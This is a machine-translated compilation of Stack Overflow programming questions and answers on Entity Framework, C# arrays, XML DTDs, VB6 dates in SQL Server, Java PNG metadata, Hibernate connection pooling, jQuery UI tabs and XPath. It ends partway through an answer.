## 回答 #1

> 赞同：4
> 
> 时间：2009-04-06T15:52:13.320

我认为您需要在 SQL Server 中更改架构，而不是在 EF 中。这篇文章的答案是关于如何使列区分大小写，看起来它可以解决问题： [T-SQL：如何创建区分大小写的唯一键？](https://stackoverflow.com/questions/485359/t-sql-how-do-i-create-a-unique-key-that-is-case-sensitive)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-04-19T02:02:56.373

我知道这不是一个完美的解决方案，但在 LINQ 中为什么不自己加入。EF 不起作用，因为 .Designer.cs 文件在执行连接时返回 objA.Equals(objB)。.Equals 区分大小写。

var result = from t1 in context.TableB join t2 in context.TableA on t1.someFieldInTableB.ToUpper() 等于 t2.someFieldInTableA.ToUpper();

Hackish 我知道，但是 LINQ to Entities 仍处于起步阶段，并且设计的对象类是出于特定原因而设计的，在这样的设计中不能处理特殊情况。

另一种选择是您可以使用 T4 模板创建自己的代码生成器。由于一切都是公共部分类，您可以创建一个导航属性，该属性实际上执行您正在寻找的不区分大小写的比较。

不过，要如实回答您的问题，没有“开箱即用”的方法可以让 EF 使用不区分大小写的搜索进行导航。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-01-26T15:19:11.643

> > 我知道这不是一个完美的解决方案，但在 LINQ 中为什么不自己加入。EF 不起作用，因为 .Designer.cs 文件在执行 >> 连接时返回 objA.Equals(objB)。.Equals 区分大小写。

好吧，如果您覆盖 Equals 方法，则不会

EF 中生成的域类是部分的，不是吗？因此，用您自己的实现替换这些类的默认 Equals 实现相当容易（这当然会使其不区分大小写）

顺便说一句：一种技术可以追溯到 .NET 1.0

由于所有这些 .NET 3.5/4.0、Linq 和 Lambda 暴力，人们往往会忘记基础知识

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-24T01:30:02.507

我想出了一个解决方法，在上下文从数据库中检索到行之后，在内存中“缝合”基于字符串的关联（提示：使用上下文。[EntityTypeCollection]。**本地属性。你可以在**[https](https://stackoverflow.com/a/12557796/62278)上看到我的答案[://stackoverflow.com/a/12557796/62278](https://stackoverflow.com/a/12557796/62278)

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2010-04-10T18:13:01.970

作为实体框架的替代方案，您可以使用 LINQ to SQL，它适用于涉及区分大小写排序规则的关系。尽管此 ORM 不能提供 EF 或 NHibernate 的所有灵活性，但在许多情况下它就足够了。

我最近在官方 Microsoft Entity Framework 论坛上发布了一个帖子：http: [//social.msdn.microsoft.com/Forums/en-US/adodotnetentityframework/thread/d4aa6880-31b3-4ff2-b7f5-e2694d76772e](http://social.msdn.microsoft.com/Forums/en-US/adodotnetentityframework/thread/d4aa6880-31b3-4ff2-b7f5-e2694d76772e)

# c# - 多维数组不实现 IEnumerable ，还是他们？

> ID：721882
> 
> 赞同：4
> 
> 时间：2009-04-06T15:06:43.600
> 
> 标签：c#, vb.net, arrays, clr

由于我仍然不明白的原因（[请参阅这个 SO 问题](https://stackoverflow.com/questions/275073/why-does-c-multidimensional-arrays-not-implement-ienumerablet)），CLR 中的多维数组没有实现`IEnumerable<T>`。因此以下内容无法编译：

```
var m = new int[2,2] {{1, 2}, {3, 4}};
var q = from e in m select e; 
```

那么为什么这**在 VB.NET 中工作得很**好呢？

```
Sub Main()
    Dim m(,) As Integer = {{1, 2}, {3, 4}}
    Dim q = From e In m Select e

    For Each i In q
        Console.WriteLine(i)
    Next
End Sub 
```

**更新：**

以下代码有效，因为 C# 编译器替换了`foreach`with`for`循环来遍历每个维度。

```
foreach(var e in m)
    Console.WriteLine(e); 
```

变成

```
int[,] numArray3 = new int[,] { { 2, 2 }, { 3, 3 } };
int upperBound = numArray3.GetUpperBound(0);
int num4 = numArray3.GetUpperBound(1);
for (int i = numArray3.GetLowerBound(0); i <= upperBound; i++)
{
    for (int j = numArray3.GetLowerBound(1); j <= num4; j++)
    {
        int num = numArray3[i, j];
        Console.WriteLine(num);
    }
} 
```

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2009-04-06T18:32:50.953

该查询在 VB.Net 中有效，因为它被转换为

```
IEnumerable<object> q = m.Cast<object>().Select<object, object>(o => o); 
```

这是有效的，因为您可以调用`Cast<TResult>`() on `IEnumerable`，它`[*,*]`实现了。

由于 C# 和 VB.Net 设计者采用了不同的方法，LINQ 查询在 C# 中不起作用。VB.Net 采用了更多的手把手的方法来修复你的错误并转换`IEnumerable`为`IEnumerable<object>`可以使用它。

在 C# 中，您可以使用

```
var q = from e in m.Cast<object>() select e; 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2009-04-06T15:10:01.597

他们没有在 C# 中本地实现它的原因有两个：

*   有不止一种方法可以做到。您想要每个“单元格”，还是想要每个“行”？你如何定义'行'：[]，IEnumerable，其他？如果有两个以上的维度怎么办？一旦他们选择了一种方式，一大群开发人员就会告诉他们他们应该以不同的方式来做。
*   多亏了迭代器块和`yield`关键字，您可以很容易地实现您自己的特定于您当时的需求。当然，这是一个 C# 构造，但在 VB 中并没有*那么*难。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2009-04-06T16:38:55.703

Array的[MSDN 页面](http://msdn.microsoft.com/library/system.array)包括：

> **重要说明：** 在 .NET Framework 2.0 版中，Array 类实现 System.Collections.Generic.IList<T>、System.Collections.Generic.ICollection<T> 和 System.Collections.Generic.IEnumerable<T> 泛型接口。这些实现在运行时提供给数组，

请注意引用中的最后一句话......似乎这一代不会发生在多维数组中（因此是一个文档错误）。

但正如其他人所指出的那样，会`T`是什么？可以为`T[]`（或者，现在使用 LINQ，`IEnumerable<T>`）做一个很好的案例。

最后，如果您想迭代所有数组的成员，只需坚持使用 IEnumerable 和 Cast<T> 扩展名。否则很容易自己写。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2009-05-23T18:24:08.887

## 提示：而不是 Cast<object>() 使用类型化范围变量

塞缪尔说：

> 在 C# 中，您可以使用
> 
> ```
> var q = from e in m.Cast<object>() select e;
> // q is of type IEnumerable<object> 
> ```

就在 C# 中模仿 VB 而言，这当然是正确的，但是您会丢失类型信息。相反，简单地声明范围变量要容易得多，而且可读性更好。

以下编译，性能更好，类型安全且不会丢失类型信息：

```
var m = new int[2, 2] { { 1, 2 }, { 3, 4 } };
var q = from int e in m select e;
// q is of type IEnumerable<int> 
```

在最初的建议中，您将拥有一个`IEnumerable<object>`, 使用`int e`您将其更改为`IEnumerable<int>`，这有其优势。

# xml - 使用带有 XML 的文档类型

> ID：721892
> 
> 赞同：3
> 
> 时间：2009-04-06T15:09:27.790
> 
> 标签：xml, dtd, doctype, entities

我使用单独的 .dtd 文件作为自定义 xml 文件的 doctype：

**名称.xml**

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE name SYSTEM "names.dtd">
<names>
    <name>
        <text>Pep&eacute;</text>
        <creator>&lost;</creator>
        <history>&lost;</history>
    </name>
    <name>
        <text>Charles</text>
        <creator>James</creator>
        <history>&lost;</history>
    </name>
</names> 
```

**名称.dtd**

```
<!ELEMENT name (text, creator+, history)>
<!ELEMENT text (#PCDATA)>
<!ELEMENT creator (#PCDATA)>
<!ELEMENT history (#PCDATA)>

<!-- Placeholder/unknown history or creator name -->
<!ENTITY lost "Lost in the depths of time.">
<!ENTITY eacute "é"> 
```

但是，当尝试访问 names.xml 时，出现以下错误：

> XML 解析错误：未定义实体位置： [http://localhost/.../names.xml](http://localhost/.../names.xml)第 5 行，第 18 列：

```
<text>Pep&eacute;</text>
---------^ 
```

只是为了澄清，names.xml 和 names.dtd 位于同一目录中，使用[http://localhost/.../names.dtd](http://localhost/.../names.dtd)也不起作用。

`<!ENTITY`但是，当将内部 a`<!DOCTYPE`放入时，这似乎确实有效`names.xml`。有人可以就此提出建议吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-04-06T16:04:24.413

Firefox[不加载外部 DTD](https://bugzilla.mozilla.org/show_bug.cgi?id=22942)（Safari 也不加载；[看起来](http://en.wikipedia.org/wiki/Comparison_of_layout_engines_(XML)#Schema_technologies)没有浏览器这样做）。如果我告诉它加载外部 DTD，您的 DTD 和 XML 在 xmllint 中工作正常：

```
$ xmllint --loaddtd names.xml 
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE names SYSTEM "names.dtd">
<names>
    <name>
        <text>Pep&eacute;</text>
        <creator>&lost;</creator>
        <history>&lost;</history>
    </name>
    <name>
        <text>Charles</text>
        <creator>James</creator>
        <history>&lost;</history>
    </name>
</names> 
```

**编辑**：正如 hsivonen 在评论中指出的那样，使用 DTD 来解析外部实体是一个[坏主意](http://hsivonen.iki.fi/no-dtd/)。通常不应在 Web 上使用 DOCTYPE 或 DTD。如果要验证文档，则应使用单独的模式（建议使用[RELAX NG](http://relaxng.org/)），而不是嵌入文档本身的 DTD。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-04-06T16:05:25.097

如果您在 Firefox 中打开文档以尝试确定 dtd 是否正确，请不要这样做。Firefox 不会通过适当的 xml 解析器传递 xml 和 dtd。在 IE 中打开您的 xml 文档，这将导致您的文档通过 MSXML 解析器。

在 IE 中打开 xml 文档时，它会抛出一个关于您的 DTD 使用无效字符的错误。您需要使用 eacute 的字符代码而不是字符本身。这是我要工作的代码...

```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE NAME SYSTEM "names.dtd">
<names>
    <name>
        <text>Pep&eacute;</text>
        <creator>&lost;</creator>
        <history>&lost;</history>
    </name>
    <name>
        <text>Charles</text>
        <creator>James</creator>
        <history>&lost;</history>
   </name>
</names> 
```

和

```
<!ELEMENT name (text, creator+, history)>
<!ELEMENT text (#PCDATA)>
<!ELEMENT creator (#PCDATA)>
<!ELEMENT history (#PCDATA)>

<!ENTITY lost "Lost in the depths of time.">
<!ENTITY eacute "&#233;"> 
```

# security - 基于用户在 PerformancePoint 中的记分卡上过滤 KPI

> ID：721895
> 
> 赞同：4
> 
> 时间：2009-04-06T15:09:46.213
> 
> 标签：security, sharepoint, performancepoint

我想过滤登录到 SharePoint 的用户在记分卡上显示的 KPI。这可能吗？

### 要求：

1.  我有几个拥有不同 KPI 的用户
2.  我正在开发 PerformancePoint 规划中的绩效管理应用程序。
3.  我**不想**为每个用户创建多个记分卡，因为这可能会遇到很多报告......
4.  我想将所有用户定向到**一张**记分卡，但它只会根据登录用户向他们显示相关的 KPI。
5.  记分卡将在 MOSS 2007 举办

如何在 PerformancePoint 中进行设置？

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-08-14T18:44:27.587

如果您创建一个包含所有 kpi 的记分卡，并且只授予 KPI 级别的访问权限，您将获得所需的准系统方法。用户无权访问的每个 KPI 的数据将显示为空白。

# sql - 如何在 VB 的 MS SQL 中只存储一个日期？

> ID：721908
> 
> 赞同：0
> 
> 时间：2009-04-06T15:12:19.953
> 
> 标签：sql, sql-server, datetime, vb6

我的项目**要求我使用 VB（5 或 6）***在 SQL Server 数据库中存储日期。SQL datetime 类型包括我不想要的时间。我也知道 VB 的日期表示并不反映 SQL Server 的表示。

那么，我怎样才能在 SQL 数据库中存储以 VB 的日期类型保存的日期，例如该日期午夜的日期时间？

编辑：我需要使用日期来进一步选择行，所以我不能在读取时截断它。

*我知道，我就是你，你不会从这里开始。但是考虑到这些限制，那里有任何 VB6/MS SQL 恶魔吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-04-06T15:18:39.157

VB6 有一个[`DateValue()`](http://www.vb6.us/tutorials/date-time-functions-visual-basic)函数，它返回日期/时间值的日期部分，时间部分“清零”。（注意：当日期/时间变量的时间部分“清零”时，时间将被解释为 12:00 AM。）

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-04-06T15:22:39.083

SQL Server 2008 具有[新的日期和时间数据类型](http://msdn.microsoft.com/en-us/library/ms186724.aspx)。如果您不想存储时间组件，则可以使用“日期”数据类型。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-04-06T15:14:44.190

使用 DateTime 列并在演示级别截断时间。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-04-06T15:20:38.277

尝试像这样插入和更新日期：

```
CAST(FLOOR(CAST(@DateTime AS float)) AS datetime) 
```

我们在 UDF 中有这个，它基本上从日期时间中剥离了时间部分。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-04-07T09:32:13.240

在 VB 中，您可以使用 Date() 函数返回没有时间元素的当前日期。

如果您将 ADO 参数对象与 Command 对象一起使用，则 OLE DB 提供程序应处理 VB Date 类型到 SQL Server DATETIME 值的转换。

在 SQL Server（SQL 2008 之前的 DATE 类型）中，您应该在列上创建一个 CHECK 约束，以确保无法添加带有时间元素的日期（请注意，我为我的 DATETIME 文字使用了明确的语言“安全”格式) 例如

```
ALTER TABLE MyTable ADD
   vb_date DATETIME NOT NULL
   CONSTRAINT vb_date__no_time_element
      CHECK ((vb_date = DATEADD(DAY, DATEDIFF(DAY, '1990-01-01T00:00:00.000', vb_date), '1990-01-01T00:00:00.000'))); 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2009-04-07T14:57:44.393

我只是`DateSerial`用来创建您需要的日期。你传递它一年、一个月和一天，它会给你一个以午夜为时间的日期。然后，您可以使用它作为参数传递给 ADO 命令或类似命令。当您阅读它时，它将有午夜，所以这不是问题。我比 DateValue 更喜欢它，因为没有字符串转换。如果你真的想要，你可以创建你自己的函数，比如使用 DateSerial 的 DateValue。

```
Function JustTheDatePlease(ByVal dtSource As Date) As Date

   JustTheDatePlease = DateSerial(Year(dtSource), Month(dtSource), Day(dtSource))

End Function 
```

如果由于某种原因您没有使用参数化查询，并且您确实应该为此找到一个很好的借口，那么您可以在查询中使用日期的 ODBC 规范形式。您只需格式化日期`{d 'yyyy-mm-dd'}`，例如`{d '2009-04-06'}`。

# java - 如何使用 Java 中的 tEXt 或 iTXt 块保存 PNG？

> ID：721918
> 
> 赞同：13
> 
> 时间：2009-04-06T15:15:02.550
> 
> 标签：java, text, png, javax.imageio

我目前正在使用 javax.imageio.ImageIO 来编写 PNG 文件。我想包含一个文本块（实际上是[此处列出](http://en.wikipedia.org/wiki/Portable_Network_Graphics#Ancillary_chunks)的任何块），但看不到这样做的方法。

从 com.sun.imageio.plugins.png.PNGMetadata 看起来应该是可能的。

我应该非常感谢任何线索或答案。

M。

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2009-04-07T07:24:17.837

经过一些反编译后我想到的解决方案如下......

```
RenderedImage image = getMyImage();         
Iterator<ImageWriter> iterator = ImageIO.getImageWritersBySuffix( "png" );

if(!iterator.hasNext()) throw new Error( "No image writer for PNG" );

ImageWriter imagewriter = iterator.next();
ByteArrayOutputStream bytes = new ByteArrayOutputStream();
imagewriter.setOutput( ImageIO.createImageOutputStream( bytes ) ); 

// Create & populate metadata
PNGMetadata metadata = new PNGMetadata();
// see http://www.w3.org/TR/PNG-Chunks.html#C.tEXt for standardized keywords
metadata.tEXt_keyword.add( "Title" );
metadata.tEXt_text.add( "Mandelbrot" );
metadata.tEXt_keyword.add( "Comment" );
metadata.tEXt_text.add( "..." );
metadata.tEXt_keyword.add( "MandelbrotCoords" ); // custom keyword
metadata.tEXt_text.add( fractal.getCoords().toString() );           

// Render the PNG to memory
IIOImage iioImage = new IIOImage( image, null, null );
iioImage.setMetadata( metadata ); // Attach the metadata
imagewriter.write( null, iioImage, null ); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2010-09-20T10:48:35.603

我们在[JGraphX](https://github.com/jgraph/jgraphx)项目中执行此操作。下载源代码并查看 com.mxgraph.util.png 包，您会在其中找到我们从 Apache Batik 源复制的三个用于编码的类。一个使用示例是在 saveXmlPng 方法中的 com.mxgraph.examples.swing.editor.EditorActions 中。稍微编辑一下代码如下：

```
mxPngEncodeParam param = mxPngEncodeParam
  .getDefaultEncodeParam(image);
param.setCompressedText(new String[] { "mxGraphModel", xml });

// Saves as a PNG file
FileOutputStream outputStream = new FileOutputStream(new File(
  filename));
try
{
 mxPngImageEncoder encoder = new mxPngImageEncoder(outputStream,
   param);

 if (image != null)
 {
  encoder.encode(image);
 }
}
finally
{
 outputStream.close();
} 
```

其中 image 是将形成 .PNG 的 BufferedImage 和 xml 是我们希望放置在 iTxt 部分中的字符串。“mxGraphModel”是该 xml 字符串的键（该部分包含一些键/值对），显然您将其替换为您的键。

同样在 com.mxgraph.util.png 下，我们编写了一个非常简单的类，它可以在不处理整个图像的情况下提取 iTxt。您可以使用 mxPngEncodeParam.setText 而不是 setCompressedText() 对 tEXt 块应用相同的想法，但压缩文本部分确实允许相当大的文本部分。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2011-03-30T12:15:58.233

我意识到这个问题早已得到解答，但如果您想在不深入“com.sun”层次结构的情况下这样做，这里有一个快速且非常丑陋的示例，因为我在其他任何地方都找不到此文档。

```
BufferedImage img = new BufferedImage(300, 300, BufferedImage.TYPE_INT_ARGB);

// Create a DOM Document describing the metadata;
// I've gone the quick and dirty route. The description for PNG is at
// [http://download.oracle.com/javase/1.4.2/docs/api/javax/imageio/metadata/doc-files/png_metadata.html][1]

Calendar c = Calendar.getInstance();
String xml = "<?xml version='1.0'?><javax_imageio_png_1.0><tIME year='"+c.get(c.YEAR)+"' month='"+(c.get(c.MONTH)+1)+"' day='"+c.get(c.DAY_OF_MONTH)+"' hour='"+c.get(c.HOUR_OF_DAY)+"' minute='"+c.get(c.MINUTE)+"' second='"+c.get(c.SECOND)+"'/><pHYs pixelsPerUnitXAxis='"+11811+"' pixelsPerUnitYAxis='"+11811+"' unitSpecifier='meter'/></javax_imageio_png_1.0>";
DOMResult domresult = new DOMResult();
TransformerFactory.newInstance().newTransformer().transform(new StreamSource(new StringReader(xml)), domresult);
Document document = dom.getResult();

// Apply the metadata to the image
ImageWriter writer = (ImageWriter)ImageIO.getImageWritersBySuffix("png").next();
IIOMetadata meta = writer.getDefaultImageMetadata(new ImageTypeSpecifier(img), null);
meta.setFromTree(meta.getMetadataFormatNames()[0], document.getFirstChild());
FileOutputStream out = new FileOutputStream("out.png");
writer.setOutput(ImageIO.createImageOutputStream(out));
writer.write(new IIOImage(img, null, meta));
out.close(); 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2011-06-17T14:30:31.653

使用 Java 1.6，我将 Mike 的代码编辑为

```
Node document = domresult.getNode(); 
```

而不是他的线

```
Document document = dom.getResult(); 
```

此外，我建议添加一行

```
writer.dispose() 
```

工作完成后，释放作者持有的任何资源。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-04-06T15:34:43.610

试试 Sixlegs Java PNG 库 ( [http://sixlegs.com/software/png/](http://sixlegs.com/software/png/) )。它声称支持所有块类型并进行私有块处理。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2013-02-17T13:58:20.653

老问题，但是... [PNGJ 可以](https://code.google.com/p/pngj/)完全控制读取和写入 PNG 块

# textbox - 弹出窗口中的 XUL 文本框不起作用

> ID：721919
> 
> 赞同：0
> 
> 时间：2009-04-06T15:15:09.757
> 
> 标签：textbox, popup, xul

我正在创建一个 Firefox 扩展。我在弹出窗口中添加了一个文本框。单击工具栏按钮会打开弹出窗口。文本框出现，但不允许我编辑它。我没有给出任何只读属性。这是代码：

```
 <popupset id="myPopupSet">
    <popup id="trial-popup" noautohide="true" position="after_start">
    <vbox>
    <label value="Enter your name:"/>
   <textbox id="identfier_box" value="This is some text."/>
   </vbox>
   </popup>
   </popupset>

<toolbarpalette id="BrowserToolbarPalette">
<toolbarbutton id="mybutton"
    class="toolbarbutton-1"
    label="Identifier"
    popup="trial-popup"
insertbefore="urlbar-container" /> 
```

谁能让我知道为什么会出现这个问题？谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2009-04-20T05:16:55.650

你真正想要的是一个面板而不是一个弹出窗口。

换成你想要的`<popup>`。`<panel>`

# sql-server - Sql Server Ce 3.5 检查约束

> ID：721920
> 
> 赞同：1
> 
> 时间：2009-04-06T15:15:23.423
> 
> 标签：sql-server, sql-server-ce, check-constraints

Sql Server ce 是否支持检查约束？我想做类似“ALTER TABLE WITH NOCHECK ADD CONSTRAINT id_range_check CHECK ( BETWEEN and )

这将在“WITH”上给出错误

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2014-09-04T09:18:56.803

SQL Server Compact 不支持 CHECK 约束[http://technet.microsoft.com/en-us/library/ms174123(v=sql.110).aspx](http://technet.microsoft.com/en-us/library/ms174123(v=sql.110).aspx)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-08-24T06:57:57.867

我的经验是 SQL CE 3.5 不支持 CHECK CONSTAINT。以下代码有效（我最初有 WITH CHECK 但失败了）：

```
ALTER TABLE [SiteUser] ADD  CONSTRAINT [FK_SiteUser_Site] FOREIGN KEY([SiteId])
REFERENCES [Site] ([SiteId]) 
```

以下执行也失败了..所以现在看来​​我可以创建外键但无法执行它..那有什么意义！？

```
ALTER TABLE [SiteUser] CHECK CONSTRAINT [FK_SiteUser_Site] 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2018-12-17T12:44:35.180

“alter table [table_name] check constraint [constraint_name]”是一个约束验证语句，而不是一个检查约束。

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2009-04-06T15:27:49.760

支持检查约束，但不支持“ `WITH NOCHECK`”选项。尝试删除它。

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2009-05-16T05:39:59.597

我相信只支持简单的约束，您上面的示例包括不支持的 BETWEEN。

# java - 如何避免过时的 MySQL/Hibernate 连接 (MySQLNonTransientConnectionException)

> ID：721923
> 
> 赞同：3
> 
> 时间：2009-04-06T15:16:20.940
> 
> 标签：java, mysql, hibernate

我有一个使用 Hibernate 和 MySQL 的 Java webapp。如果该站点几天没有使用，MySQL 连接就会失效，我会遇到以下异常：

```
com.mysql.jdbc.exceptions.jdbc4.MySQLNonTransientConnectionException: Connection.close() has already been called. Invalid operation in this state. 
```

根据使用原始 JDBC 的经验，可以将连接配置为尝试从错误或过时的连接中恢复，但我不知道如何使用 Hibernate 来做到这一点。我没有在任何地方明确调用 close() （但我打赌 Hibernate 在其内心深处的某个地方）。

有人知道我应该怎么做吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-04-06T15:26:31.370

你用的是什么连接池？

[Hibernate 建议](http://www.hibernate.org/117.html#A15)不要使用内置池，而是使用应用程序服务器数据源或[Commons DBCP](http://commons.apache.org/dbcp/)或[C3PO](http://sourceforge.net/projects/c3p0)之类的东西。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2009-04-06T15:27:43.067

我有那个问题。使用连接池（c3p0）使它消失了。一般来说，使用一些连接池也是一个好主意。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2009-04-06T16:02:20.237

感谢您的建议。为了后代，我将 hibernate.cfg.xml 从以下内容更改为：

```
<property name="connection.url">jdbc:mysql://localhost/FooDB</property>
<property name="connection.username">root</property>
<property name="connection.driver_class">com.mysql.jdbc.Driver</property>
<property name="dialect">org.hibernate.dialect.MySQLDialect</property>
<property name="connection.password">secret</property>
<property name="transaction.factory_class">org.hibernate.transaction.JDBCTransactionFactory</property> 
```

...到以下内容：

```
<property name="connection.datasource">java:/comp/env/jdbc/FooDB</property> 
<property name="dialect">org.hibernate.dialect.MySQLDialect</property> 
```

这还需要在我的 Web 应用程序的 context.xml 中添加一个标准的“上下文”条目：

```
<Resource name="jdbc/FooDB"
          auth="Container"
          type="javax.sql.DataSource"
          maxActive="100"
          maxIdle="30"
          maxWait="10000"
          username="root"
          password="secret"
          driverClassName="com.mysql.jdbc.Driver"
          url="jdbc:mysql://localhost:3306/ss?autoReconnect=true" /> 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-04-11T08:14:19.547

我们遇到了类似的休眠 mysql 连接超时问题。所以我们尝试了C3P0，配置如下：

```
<property name=c3p0.acquire_increment>1</property>
<property name=c3p0.idle_test_period>3600</property> 
<property name=c3p0.max_statements>0</property> 
<property name=c3p0.min_size>1</property> 
<property name=c3p0.timeout>3605</property> 
<property name=hibernate.c3p0.preferredTestQuery>select 1;</property> 
```

休眠连接池大小设置为 1。

这使得超时问题消失了。但我们开始面临另一个问题。漫长的等待。我们有一个服务（在 jboss 上运行的 servlet），它每秒接收大约 5-6 个请求。每个请求都需要通过hibernate连接到mysql。我们的大多数请求都进行选择，每 5-6 个请求插入/更新一次。通常我们的请求服务时间是 2-3ms 选择和 40-50ms 插入/更新。但是，在使用上述 C3P0 配置后，我们看到在更新后完成每个请求几乎需要 4-5 分钟！从我们的日志中，似乎随机选择请求会卡住，并且只有在收到并提供更新请求后才能完成。

如果我们删除 C3P0 配置，上述问题就会消失。有人可以建议我们做错了什么吗？

这是完整的休眠配置供参考：

```
<?xml version="1.0" encoding="utf-8" ?>
<!DOCTYPE hibernate-configuration PUBLIC
          "-//Hibernate/Hibernate Configuration DTD 3.0//EN"
          "http://hibernate.sourceforge.net/hibernate-configuration-3.0.dtd">
<hibernate-configuration>
    <session-factory>
        <property name="connection.driver_class">com.mysql.jdbc.Driver</property>
        <property name="connection.url">jdbc:mysql://xxx.xxx.xxx</property>
        <property name="connection.username">xxx</property>
        <property name="connection.password">xxx</property>
        <property name="connection.pool_size">1</property>
        <property name="dialect">org.hibernate.dialect.MySQLDialect</property>
        <property name="current_session_context_class">thread</property>
        <property name="hibernate.cache.use_query_cache">false</property>
        <property name="hibernate.cache.use_second_level_cache">false</property>
        <property name="show_sql">true</property>
        <!-- Transaction isolation 2 = READ_COMMITTED -->
        <property name="connection.isolation">2</property>
        <property name="connection.autocommit">true</property>
        <!-- configuration pool via c3p0-->
        <property name="c3p0.acquire_increment">1</property>
        <property name="c3p0.idle_test_period">3600</property> <!-- seconds -->
        <property name="c3p0.max_size">1</property>
        <property name="c3p0.max_statements">0</property>
        <property name="c3p0.min_size">1</property>
        <property name="c3p0.timeout">3605</property> <!-- seconds -->
        <property name="hibernate.c3p0.preferredTestQuery">select 1;</property>
    </session-factory>
</hibernate-configuration> 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2009-11-06T12:59:16.937

```
<property name="c3p0.acquire_increment">1</property> 
<property name="c3p0.idle_test_period">120</property> <!-- seconds --> 
<property name="c3p0.max_size">100</property> 
<property name="c3p0.max_statements">0</property> 
<property name="c3p0.min_size">10</property> 
<property name="c3p0.timeout">180</property> <!-- seconds --> 
```

在您的配置文件中覆盖这些设置。它会对你有所帮助。

# jquery - 空的 jQuery UI 选项卡

> ID：721927
> 
> 赞同：1
> 
> 时间：2009-04-06T15:18:06.630
> 
> 标签：jquery, jquery-ui, jquery-ui-tabs

如何清空（删除所有选项卡）jQuery UI 选项卡？

*编辑：我不是要删除选项卡功能，而是要清空所有选项卡以添加新选项卡。*

我正在尝试：

```
for (var i = $('#content').tabs('length') - 1; i >= 0; i--) {
    $('#content').tabs('remove', i);
} 
```

但是 tabs('length') 总是返回 0，即使控件中添加了一些选项卡。

顺便说一句，我将它初始化为空

```
$('#content').tabs(); 
```

并在之后动态添加标签

```
$('#content').tabs( 'add' , '' , data[i].nombre); 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2011-10-14T20:24:32.593

我在遍历选项卡并将它们全部删除时遇到了麻烦，就像您在问题中所做的那样。我的解决方案是删除第 0 个选项卡的次数等于选项卡对象的“长度”方法返回的值：

```
var tab_count = $('#tabs').tabs('length');
for (i=0; i<tab_count; i++){
    $('#tabs').tabs( "remove" , 0 )
} 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-04-17T13:04:05.813

我有一个类似的问题。为了在加载新标签之前从先前的请求中删除标签，我采取了以下步骤：

1.  删除了标签（#tabs ul li），
2.  删除标签内容（#tabs div）和
3.  刷新了标签。

这是我使用的代码。为我工作。希望对你有效。

```
$('div#tabs ul li').remove();
$('div#tabs div').remove();
$("div#tabs").tabs("refresh"); 
```

我在网上找到的其他解决方案对我不起作用。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2009-04-06T15:26:35.690

您应该能够从选择器中取消绑定选项卡。

```
$('#content').unbind(); 
```

编辑：

直接来自 jQuery 文档

```
.tabs( 'destroy' ); 
```

完全删除标签功能。这将使元素返回到它的预初始化状态。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2009-04-06T15:49:36.180

您是否尝试添加带有非空 url 的选项卡？

```
$('#content').tabs( 'add' , 'non empty url' , data[i].nombre); 
```

复制自官方文档（[http://docs.jquery.com/UI/Tabs#method-add](http://docs.jquery.com/UI/Tabs#method-add)）

```
.tabs( 'add' , url , label , [index] ) 
```

添加一个新选项卡。第二个参数要么是一个包含片段标识符的 URL，仅用于创建页内选项卡，要么是一个完整的 url（相对或绝对，不支持跨域），以将新选项卡转换为 Ajax（远程）选项卡。第三个是插入新标签的从零开始的位置。可选，默认情况下会在末尾附加一个新选项卡。

# xml - XPath 选择多个标签

> ID：721928
> 
> 赞同：149
> 
> 时间：2009-04-06T15:18:24.273
> 
> 标签：xml, xpath

鉴于这种简化的数据格式：

```
<a>
    <b>
        <c>C1</c>
        <d>D1</d>
        <e>E1</e>
        <f>don't select this one</f>
    </b>
    <b>
        <c>C2</c>
        <d>D2</d>
        <e>E1</e>
        <g>don't select me</g>
    </b>
    <c>not this one</c>
    <d>nor this one</d>
    <e>definitely not this one</e>
</a> 
```

您将如何选择作为元素子级的所有`C`s、`D`s 和s ？`E``B`

基本上，类似：

```
a/b/(c|d|e) 
```

在我自己的情况下，`a/b/`导致选择那些`C`, `D`,`E`节点的查询实际上非常复杂，所以我想避免这样做：

```
a/b/c|a/b/d|a/b/e 
```

这可能吗？

* * *

## 回答 #1

> 赞同：236
> 
> 时间：2009-04-06T16:41:59.957

**一个正确的答案是**：

```
/a/b/*[self::c or self::d or self::e] 
```

**请注意，这**

```
